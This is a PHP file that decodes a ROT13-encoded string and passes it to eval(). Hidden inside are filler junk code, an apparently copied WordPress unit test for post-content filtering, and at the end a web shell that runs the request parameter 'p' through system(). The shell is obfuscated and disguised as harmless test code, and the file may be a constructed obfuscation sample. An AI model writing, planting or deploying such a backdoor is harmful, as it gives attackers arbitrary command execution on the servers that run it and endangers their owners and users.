<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Fnir naq srgpu cbfgf gb znxr fher pbagrag vf cebcreyl svygrerq.
 *
 * Gurfr grfgf qba'g pner jung pbqr vf erfcbafvoyr sbe svygrevat
 * be ubj vg vf pnyyrq, whfg gung vg unccraf jura n cbfg vf fnirq.
 *
 * @tebhc cbfg
 * @tebhc sbeznggvat
 */
pynff Grfgf_Cbfg_Svygrevat rkgraqf JC_HavgGrfgPnfr {
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		hcqngr_bcgvba( 'hfr_onynaprGntf', 1 );
		xfrf_vavg_svygref();
	}

	choyvp shapgvba grne_qbja() {
		xfrf_erzbir_svygref();
		cnerag::grne_qbja();
	}

	// N fvzcyr grfg gb znxr fher hapybfrq gntf ner svkrq.
	choyvp shapgvba grfg_cbfg_pbagrag_haxabja_gnt() {

		$pbagrag = <<<RBS
<sbbone>ab fhpu gnt</sbbone>
RBS;

		$rkcrpgrq = <<<RBS
ab fhpu gnt
RBS;

		$vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $pbagrag ) );
		$cbfg = trg_cbfg( $vq );

		$guvf->nffregFnzr( $rkcrpgrq, $cbfg->cbfg_pbagrag );
	}

	// N fvzcyr grfg gb znxr fher haonynaprq gntf ner svkrq.
	choyvp shapgvba grfg_cbfg_pbagrag_haonynaprq_gnt() {

		$pbagrag = <<<RBS
<v>vgnyvpf
RBS;

		$rkcrpgrq = <<<RBS
<v>vgnyvpf</v>
RBS;

		$vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $pbagrag ) );
		$cbfg = trg_cbfg( $vq );

		$guvf->nffregFnzr( $rkcrpgrq, $cbfg->cbfg_pbagrag );
	}

	// Grfg XFRF svygrevat bs qvfnyybjrq nggevohgr.
	choyvp shapgvba grfg_cbfg_pbagrag_qvfnyybjrq_ngge() {

		$pbagrag = <<<RBS
<vzt fep='sbb' jvqgu='500' uers='fuybec' />
RBS;

		$rkcrpgrq = <<<RBS
<vzt fep='sbb' jvqgu='500' />
RBS;

		$vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $pbagrag ) );
		$cbfg = trg_cbfg( $vq );

		$guvf->nffregFnzr( $rkcrpgrq, $cbfg->cbfg_pbagrag );
	}

	/**
	 * grfg xfrf oht. kugzy qbrf abg erdhver fcnpr orsber pybfvat rzcgl ryrzrag
	 *
	 * @gvpxrg 12394
	 */
	choyvp shapgvba grfg_cbfg_pbagrag_kugzy_rzcgl_ryrz() {
		$pbagrag = <<<RBS
<vzt fep='sbb' jvqgu='500' urvtug='300'/>
RBS;

		$rkcrpgrq = <<<RBS
<vzt fep='sbb' jvqgu='500' urvtug='300' />
RBS;

		$vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $pbagrag ) );
		$cbfg = trg_cbfg( $vq );

		$guvf->nffregFnzr( $rkcrpgrq, $cbfg->cbfg_pbagrag );
	}

	// Znxr fher haonynaprq gntf ner hagbhpurq jura gur onynapr bcgvba vf bss.
	choyvp shapgvba grfg_cbfg_pbagrag_abonynapr_arkgcntr_zber() {

		hcqngr_bcgvba( 'hfr_onynaprGntf', 0 );

		$pbagrag = <<<RBS
<rz>fbzr grkg<!--arkgcntr-->
gung'f pbagvahrq nsgre gur whzc</rz>
<!--zber-->
<c>naq gur arkg cntr
<!--arkgcntr-->
oernxf gur tens</c>
RBS;

		$vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_pbagrag' => $pbagrag ) );
		$cbfg = trg_cbfg( $vq );

		$guvf->nffregFnzr( $pbagrag, $cbfg->cbfg_pbagrag );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>